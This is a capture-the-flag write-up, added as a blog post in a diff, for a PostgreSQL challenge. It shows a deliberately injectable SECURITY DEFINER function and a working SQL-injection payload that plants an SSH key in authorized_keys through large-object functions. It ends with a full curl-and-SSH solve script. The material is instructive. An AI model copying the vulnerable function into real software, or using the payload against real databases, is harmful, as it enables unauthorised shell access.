@@ -1,0 +1,221 @@
+---
+authors: [varik]
+date: 2024-12-23
+tags: [CTF, Cyhub2024, Postgres]
+title: Cyhub CTF 2024 - pg_lo
+---
+
+# Cyhub CTF 2024 - pg_lo
+
+At this year’s Cyhub CTF in Armenia, I decided to create some unique challenges. Since my work over the past year has been heavily focused on PostgreSQL, I came up with an interesting challenge involving [PostgreSQL Large Objects](https://www.postgresql.org/docs/current/largeobjects.html).
+
+The task was solved by only one team, AIrucner, who also won the CTF.
+
+## Challenge Description
+
+**The challenge was described as follows:**
+
+> Do we really need blob storage when we can store image files directly in PostgreSQL using large objects?
+Recently, we cut our costs by migrating from S3 to PostgreSQL but haven’t had time to audit the code…
+Who cares, right? If it works, it works. :)
+
+Participants were provided with source code and a connection string, along with two accessible ports: 8080 and 2222.
+
+## Challenge Goal
+
+The challenge involved three components: a web server, a PostgreSQL database, and an SSH server.
+
+The objective was to read the contents of the `/flag.txt` file.
+The intended solution was to SSH into the machine and retrieve the flag file.
+
+> The flag.png file was a rabbit hole.
+
+## Challenge Explanation
+ 
+The database was set up using an `init.sh` script, which performed the following actions:
+
+- Created a database user `app_user` with a provided password.
+- Loaded the `init.sql` file into the database.
+
+The `init.sql` script initialized the necessary table and function for the challenge:
+
+1. Tables and Roles:
+  - Created a `messages` table.
+  - Created a role `cyhub`.
+  
+2. Dummy Data:
+  - Inserted dummy data into the messages table.
+  - This data was unrelated to the flag, intended to mislead solvers into thinking they needed to access `flag.png`.
+
+3. Vulnerable Function:
+  - Created a `get_message` function as the `cyhub` user, declaring it with `SECURITY DEFINER`.
+  - This meant the function always executed with cyhub’s privileges, regardless of the caller.
+  - The function used `EXECUTE` and `format`, with `%s` formatting, introducing an SQL injection vulnerability.
+
+
+```sql
+CREATE TABLE messages(id INT PRIMARY KEY, msg TEXT, img_oid OID);
+
+CREATE ROLE cyhub;
+
+GRANT USAGE ON SCHEMA public TO app_user;
+GRANT USAGE ON SCHEMA public TO cyhub;
+GRANT CREATE ON SCHEMA public TO cyhub;
+
+GRANT ALL PRIVILEGES ON TABLE public.messages TO cyhub;
+GRANT EXECUTE ON FUNCTION pg_catalog.lo_from_bytea(OID, bytea) TO cyhub;
+GRANT EXECUTE ON FUNCTION pg_catalog.lo_import(TEXT, OID) TO cyhub;
+GRANT EXECUTE ON FUNCTION pg_catalog.lo_export(OID, TEXT) TO cyhub;
+
+SET ROLE cyhub;
+
+DO $$
+BEGIN
+    PERFORM lo_import('/images/flag.png', 1337);
+    PERFORM lo_import('/images/1.png', 1);
+    PERFORM lo_import('/images/2.png', 2);
+    PERFORM lo_import('/images/3.png', 3);
+    INSERT INTO messages(id, msg, img_oid) VALUES 
+        (1, 'First Image', 1),
+        (2, 'Second Image', 2),
+        (3, 'Third Image', 3),
+        (1337, 'Check this 1337 image!', 1337);
+END $$;
+
+CREATE OR REPLACE FUNCTION get_message(p_id TEXT) RETURNS TEXT AS $$
+DECLARE
+    result TEXT;
+BEGIN
+    EXECUTE format('SELECT encode(lo_get(messages.img_oid), ''base64'') as img FROM messages WHERE id=%s::INT', p_id) INTO result;
+    RETURN result;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+
+CREATE OR REPLACE FUNCTION get_messages() RETURNS TABLE (id INT, msg TEXT, img TEXT) AS $$
+DECLARE
+    query TEXT;
+BEGIN
+    RETURN QUERY
+    SELECT messages.id, messages.msg, encode(lo_get(messages.img_oid), 'base64') as img 
+    FROM messages;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+
+RESET ROLE;
+
+GRANT EXECUTE ON FUNCTION get_message(TEXT) TO app_user;
+GRANT EXECUTE ON FUNCTION get_messages() TO app_user;
+
+```
+	
+
+There's also a simple web-server written with `express`, which should be used to access the vulnerable function and perform the exploit.
+
+```js
+const express = require('express');
+const { Client } = require('pg');
+
+const app = express();
+const port = 8080;
+
+const client = new Client({
+  user: 'app_user',
+  host: 'localhost',
+  database: 'postgres',
+  password: process.env.APP_USER_PASSWORD,
+  port: 5432,
+});
+
+client.connect();
+
+app.get('/', (_, res) => res.sendFile(__dirname + '/index.html'));
+
+app.get('/messages', async (req, res) => {
+  const { id } = req.query;
+
+  try {
+
+    if (parseInt(id) === '1337') {
+      return res.status(403).end();
+    }
+
+    let result = [];
+    if (!id) {
+      result = (await client.query('SELECT * FROM get_messages() WHERE id != 1337')).rows;
+    } else {
+      result = (await client.query('SELECT * FROM get_message($1)', [id])).rows.map(row => ({ id: 0, msg: '', img: row.img }));
+    }
+
+    res.json({ messages: result }).end();
+  } catch (err) {
+    console.error('Error querying PostgreSQL:', err);
+    res.status(500).json({ error: 'Internal Server Error' });
+  }
+});
+
+app.listen(port, '0.0.0.0', () => {
+  console.log(`Server is running on http://localhost:${port}`);
+});
+```
+
+## Exploiting the Challenge
+
+By identifying the SQL injection vulnerability in `get_message`, solvers might initially try the common `COPY FROM PROGRAM` method 
+to get a reverse shell. However, since the `cyhub` user is not a superuser, this approach wouldn’t work.
+
+
+Instead, solvers needed to:
+    - Create a large object containing their public key using `lo_from_bytea`.
+    - Export the large object to `/var/lib/postgres/.ssh/authorized_keys` using `lo_export`.
+
+
+Here’s the SQL payload to achieve this:
+
+```sql
+SELECT get_message(
+    '1::int; 
+     SELECT lo_from_bytea(31337, ''ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwkzp4b8trXLEXMw1Co/TVynIvFzdXp/z1f4Xel1KT/''::bytea); 
+     SELECT lo_export(31337, ''/var/lib/postgresql/.ssh/authorized_keys''); 
+     --'
+);
+```
+
+To execute this via the web server:
+```sh
+curl --get \
+    --data-urlencode "id=1::int; SELECT lo_from_bytea(31337,'${PUBLIC_KEY}'::bytea); SELECT lo_export(31337, '/var/lib/postgresql/.ssh/authorized_keys'); --" \
+    http://localhost:8080/messages
+```
+
+After putting the public key under `authorized_keys`, solvers could SSH into the machine and read the flag:
+
+```sh
+ssh -o StrictHostKeyChecking=no -p 2222 "postgres@127.0.0.1" -i /tmp/id_rsa cat /flag.txt
+```
+
+## Complete Solution
+
+```sh
+set -e
+
+HOST=127.0.0.1
+SSH_PORT=2222
+WEBSERVER_PORT=8080
+
+echo "Generating new keypair..."
+ssh-keygen -t ed25519 -f /tmp/id_rsa -N "" -q -y > /dev/null
+
+PUBLIC_KEY=$(cat /tmp/id_rsa.pub)
+echo "Sending payload..."
+curl --get -s -o /dev/null \
+    --data-urlencode "id=1::int; SELECT lo_from_bytea(31337,'${PUBLIC_KEY}'::bytea); SELECT lo_export(31337, '/var/lib/postgresql/.ssh/authorized_keys'); --" \
+    -H "Connection: close" \
+    http://${HOST}:${WEBSERVER_PORT}/messages
+
+echo "Reading flag...\n"
+ssh -o StrictHostKeyChecking=no -p ${SSH_PORT} "postgres@${HOST}" -i /tmp/id_rsa cat /flag.txt
+```
+
+This challenge combined SQL injection and PostgreSQL’s large object API to craft the exploit. It was great to see AIrucner solve it without any hints!
+
+The challenge source code can be found [here](https://github.com/var77/cyhubctf2024/tree/main/pg_lo)
